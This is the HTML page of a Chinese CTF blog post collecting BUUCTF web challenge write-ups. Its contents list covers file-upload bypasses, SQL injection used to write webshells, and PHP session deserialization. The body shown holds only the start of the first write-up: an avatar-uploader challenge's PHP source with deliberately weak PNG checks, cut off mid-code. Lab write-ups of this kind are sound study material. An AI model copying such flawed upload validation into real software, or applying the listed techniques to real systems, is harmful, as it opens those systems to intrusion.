<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-trophy-1.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha256-Z1K5uhUaJXA7Ll0XrZ/0JhX4lAtZFpT6jkKrEDT0drU=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"z1d10t.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"æœç´¢...","empty":"æ²¡æœ‰æ‰¾åˆ°ä»»ä½•æœç´¢ç»“æœï¼š${query}","hits_time":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœï¼ˆç”¨æ—¶ ${time} æ¯«ç§’ï¼‰","hits":"æ‰¾åˆ° ${hits} ä¸ªæœç´¢ç»“æœ"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰">
<meta property="og:type" content="article">
<meta property="og:title" content="buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰">
<meta property="og:url" content="https://z1d10t.github.io/post/d33f9f0e.html">
<meta property="og:site_name" content="Z1d10tã®Blog">
<meta property="og:description" content="buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578104255-28975875-7950-4504-9327-5b15c60952bb.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578140917-e7bfeac6-bd41-4084-91de-0ac3d3137d68.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578241021-d8677a96-be39-441b-80ea-27bfc18677cb.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578269747-e962712b-9a68-4004-adde-9f8db3b60f18.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689578387080-53ad022c-e65d-4003-887e-d1d92ceab8d4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689579753906-b0e3ebde-2b81-4cb3-a9f0-63176d7ea6fc.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689584978289-6c38ec2a-8a6f-4cf9-bac3-a3d6e45ad99b.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585086139-4169ecf7-ab7b-45b8-86fc-f94a956ea8d4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689585887772-568d3234-ea97-458e-9479-d40477f308b3.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586290324-cb408fc9-2f9f-4667-8971-6bec93fef49b.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586916100-cb946524-270b-4b18-a5bc-5f0df59a7c1f.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689586959408-c62cf98f-999c-4bf5-b00a-071047f80595.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689589242051-f7b75cce-acff-450e-b3d1-cb3da4fe2d1c.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742999096-b318c342-ce4a-475b-a82b-479e913e7f0b.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743053375-32586548-cdef-45ab-9fd0-9d420a14c6b5.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689743421112-e924c505-196c-450c-8811-58f86831aa55.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742013537-59d3d70f-8100-4372-a4d1-ffb424e4e727.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741475222-474413c2-512d-4fdc-9496-c77c237cf241.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741512376-6e560d1f-9068-48c5-a07b-73a7ed625bb8.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748463034-f5b3908d-9721-433c-aabf-caf52a779bc9.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748624364-dcb3a261-6eda-4b4c-b527-ca68431e5347.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838045915-1e652331-c3d3-49a1-8689-efe900b70c8f.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838230226-da7aa30a-ee41-4f54-b33b-ad23d0c2f0f4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689840034510-98325feb-b607-4124-bebc-3c2155883f5d.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841296825-af77f53d-2cd9-4628-bce9-ce1423b66c83.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841351215-aff04d5a-2019-4055-8abc-c8cf413c22c4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841581083-5f4b6cae-f94e-4b3f-b789-3d2336b40959.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841713358-d2c8e3ff-c663-4305-85dc-74b7785188e7.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689864728281-c032ebaf-c62c-4b99-835a-e88cdcfe9cc7.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689865079531-bdee449b-dea8-4904-858a-844632b40566.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914183098-3d85e411-a2a5-4148-9710-278f7949f707.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914873442-69582790-3062-440f-850f-34d2eb748016.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914689440-f88fdcbe-0b73-4659-99df-fd94033ce083.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914737673-48bf1329-9c2b-46d5-bdd8-0d533f171351.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920107307-9ef4226b-6c09-496c-a88a-9e74d6abd4e4.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920342664-afd98b25-24e8-43c4-9bec-4f10ce93dd4b.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920296884-1a0e4198-a879-4cb9-9477-c73e849b53c9.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920490507-9295d8b4-8c6b-4185-9555-4a339bbc66f1.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921496468-5989a398-9503-40ac-9ab4-563419de6dfb.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689928467956-3270cb40-1179-4a4e-b07c-0830b11f0a61.png">
<meta property="og:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689930191463-8262e26e-2d8a-4455-84c1-9ba94f9306b0.png">
<meta property="article:published_time" content="2023-07-22T08:40:13.000Z">
<meta property="article:modified_time" content="2023-07-25T05:59:01.545Z">
<meta property="article:author" content="Z1d10t">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png">


<link rel="canonical" href="https://z1d10t.github.io/post/d33f9f0e.html">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z1d10t.github.io/post/d33f9f0e.html","path":"post/d33f9f0e.html","title":"buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰ | Z1d10tã®Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ " role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Z1d10tã®Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description"> </p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="æœç´¢" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-house fa-fw"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tag fa-fw"></i>æ ‡ç­¾</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-rectangle-list fa-fw"></i>åˆ†ç±»</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>åšä¸»</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#113%E3%80%81-HarekazeCTF2019-Avatar-Uploader-1"><span class="nav-number">1.</span> <span class="nav-text">113ã€[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#114%E3%80%81-BSidesCF-2019-SVGMagic"><span class="nav-number">2.</span> <span class="nav-text">114ã€[BSidesCF 2019]SVGMagic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#115%E3%80%81-ISITDTU-2019-EasyPHP"><span class="nav-number">3.</span> <span class="nav-text">115ã€[ISITDTU 2019]EasyPHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#116%E3%80%81-FireshellCTF2020-Caas"><span class="nav-number">4.</span> <span class="nav-text">116ã€[FireshellCTF2020]Caas</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#117%E3%80%81-N1CTF-2018-eating-cms"><span class="nav-number">5.</span> <span class="nav-text">117ã€[N1CTF 2018]eating_cms</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#118%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-Upload"><span class="nav-number">6.</span> <span class="nav-text">118ã€[å¼ºç½‘æ¯ 2019]Upload</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#119%E3%80%81-GYCTF2020-Ez-Express"><span class="nav-number">7.</span> <span class="nav-text">119ã€[GYCTF2020]Ez_Express</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#120%E3%80%81-SUCTF-2018-MultiSQL"><span class="nav-number">8.</span> <span class="nav-text">120ã€[SUCTF 2018]MultiSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8Dchar-%E5%86%99%F0%9F%90%8E"><span class="nav-number">8.1.</span> <span class="nav-text">ç¬¬ä¸€ç§char()å†™ğŸ</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D-hex-%E6%90%AD%E9%85%8D%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%86%99%F0%9F%90%8E"><span class="nav-number">8.2.</span> <span class="nav-text">ç¬¬äºŒç§ hex()æ­é…åå…­è¿›åˆ¶å†™ğŸ</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#121%E3%80%81bestphp%E2%80%99s-revenge"><span class="nav-number">9.</span> <span class="nav-text">121ã€bestphpâ€™s revenge</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#call-user-func"><span class="nav-number">9.1.</span> <span class="nav-text">call_user_func()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="nav-number">9.2.</span> <span class="nav-text">php sessionååºåˆ—åŒ–æœºåˆ¶</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SoapClient"><span class="nav-number">9.3.</span> <span class="nav-text">SoapClient</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#122%E3%80%81-%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-%E4%B8%8D%E6%98%AF%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">10.</span> <span class="nav-text">122ã€[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#123%E3%80%81-%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp"><span class="nav-number">11.</span> <span class="nav-text">123ã€[ç¾ŠåŸæ¯2020]easyphp</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#124%E3%80%81-GXYCTF2019-BabysqliV3-0"><span class="nav-number">12.</span> <span class="nav-text">124ã€[GXYCTF2019]BabysqliV3.0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">12.1.</span> <span class="nav-text">åˆ†æï¼š</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F%EF%BC%9A"><span class="nav-number">12.2.</span> <span class="nav-text">éé¢„æœŸï¼š</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3"><span class="nav-number">12.3.</span> <span class="nav-text">é¢„æœŸè§£:</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z1d10t"
      src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
  <p class="site-author-name" itemprop="name">Z1d10t</p>
  <div class="site-description" itemprop="description">é‚ªç‹çœŸçœ¼æ˜¯æœ€å¼ºçš„ï¼</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">83</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">82</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
        <div class="back-to-top animated" role="button" aria-label="è¿”å›é¡¶éƒ¨">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z1d10t.github.io/post/d33f9f0e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1695400865185.png">
      <meta itemprop="name" content="Z1d10t">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z1d10tã®Blog">
      <meta itemprop="description" content="é‚ªç‹çœŸçœ¼æ˜¯æœ€å¼ºçš„ï¼">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰ | Z1d10tã®Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-07-22 16:40:13" itemprop="dateCreated datePublished" datetime="2023-07-22T16:40:13+08:00">2023-07-22</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-07-25 13:59:01" itemprop="dateModified" datetime="2023-07-25T13:59:01+08:00">2023-07-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/buuctf/" itemprop="url" rel="index"><span itemprop="name">buuctf</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>buuåˆ·é¢˜ï¼ˆpage 4-2ï¼‰ </p>
<span id="more"></span>

<p>è¶Šæ¥è¶Šå¤æ‚ è¶Šæ¥è¶ŠåƒåŠ›äº† â€“^â€“</p>
<h1 id="113ã€-HarekazeCTF2019-Avatar-Uploader-1"><a href="#113ã€-HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="113ã€[HarekazeCTF2019]Avatar Uploader 1"></a>113ã€[HarekazeCTF2019]Avatar Uploader 1</h1><p>ä¸€é“æŒºæœ‰è¶£çš„é¢˜ç›®</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689577625490-fcbf4e82-bb82-4697-9017-5a1190e19d50.png" alt="img"></p>
<p>ç™»å½•ä¸€ä¸‹ è®©æˆ‘ä»¬ä¸Šä¼ å¤´åƒ å¹¶ä¸”å›¾ç‰‡æ ¼å¼ä¸ºpng å¹¶ä¸”å¤§å°å°äº256x256</p>
<p>ok è¿™é“é¢˜ç›®æˆ‘å…¶å®æœ€å¤§çš„ç–‘æƒ‘æ˜¯æºç æ€ä¹ˆæ¥çš„ ä¹Ÿè®¸åªæ˜¯buuæ²¡ç»™æºç ï¼Ÿ</p>
<p>ç›´æ¥æ¥çœ‹æºç </p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">require_once(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">require_once(<span class="string">&#x27;lib/util.php&#x27;</span>);</span><br><span class="line">require_once(<span class="string">&#x27;lib/session.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$session</span> = new <span class="title class_">SecureClientSession</span>(<span class="variable constant_">CLIENT_SESSION_ID</span>, <span class="variable constant_">SECRET_KEY</span>);</span><br><span class="line"> </span><br><span class="line"><span class="regexp">//</span> check whether file is uploaded</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) |<span class="params"></span>| !is_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">    error(<span class="string">&#x27;No file was uploaded.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">/<span class="regexp">/ check file size</span></span><br><span class="line"><span class="regexp">if ($_FILES[&#x27;file&#x27;][&#x27;size&#x27;] &gt; 256000) &#123;</span></span><br><span class="line"><span class="regexp">    error(&#x27;Uploaded file is too large.&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ check file type</span></span><br><span class="line"><span class="regexp">$finfo = finfo_open(FILEINFO_MIME_TYPE);/</span><span class="regexp">/è·å–æ–‡ä»¶MIMEç±»å‹</span></span><br><span class="line"><span class="regexp">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span></span><br><span class="line"><span class="regexp">finfo_close($finfo);</span></span><br><span class="line"><span class="regexp">if (!in_array($type, [&#x27;image/png</span><span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> file is <span class="keyword">not</span> <span class="variable constant_">PNG</span> format.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">// check file width/height</span></span><br><span class="line"><span class="string">$size = getimagesize($_FILES[&#x27;</span>file<span class="string">&#x27;][&#x27;</span>tmp_name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">if ($size[0] &gt; 256 || $size[1] &gt; 256) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> image is too large.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">if ($size[2] !== IMAGETYPE_PNG) &#123;</span></span><br><span class="line"><span class="string">    // I hope this never happens...</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">What</span> happened...? <span class="variable constant_">OK</span>, the flag <span class="keyword">for</span> part <span class="number">1</span> <span class="symbol">is:</span> &lt;code&gt;<span class="string">&#x27; . getenv(&#x27;</span><span class="variable constant_">FLAG1</span><span class="string">&#x27;) . &#x27;</span>&lt;<span class="regexp">/code&gt;&#x27;);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"> </span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ ok</span></span><br><span class="line"><span class="regexp">$filename = bin2hex(random_bytes(4)) . &#x27;.png&#x27;;</span></span><br><span class="line"><span class="regexp">move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], UPLOAD_DIR . &#x27;/</span><span class="string">&#x27; . $filename);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">$session-&gt;set(&#x27;</span>avatar<span class="string">&#x27;, $filename);</span></span><br><span class="line"><span class="string">flash(&#x27;</span>info<span class="string">&#x27;, &#x27;</span><span class="title class_">Your</span> avatar has been successfully updated!<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">redirect(&#x27;</span>/<span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>æœ€é‡è¦çš„æ˜¯è¿™ä¸¤éƒ¨åˆ†ï¼š</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/ check file type</span></span><br><span class="line"><span class="regexp">$finfo = finfo_open(FILEINFO_MIME_TYPE);/</span><span class="regexp">/è·å–æ–‡ä»¶MIMEç±»å‹</span></span><br><span class="line"><span class="regexp">$type = finfo_file($finfo, $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);</span></span><br><span class="line"><span class="regexp">finfo_close($finfo);</span></span><br><span class="line"><span class="regexp">if (!in_array($type, [&#x27;image/png</span><span class="string">&#x27;])) &#123;</span></span><br><span class="line"><span class="string">    error(&#x27;</span><span class="title class_">Uploaded</span> file is <span class="keyword">not</span> <span class="variable constant_">PNG</span> format.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 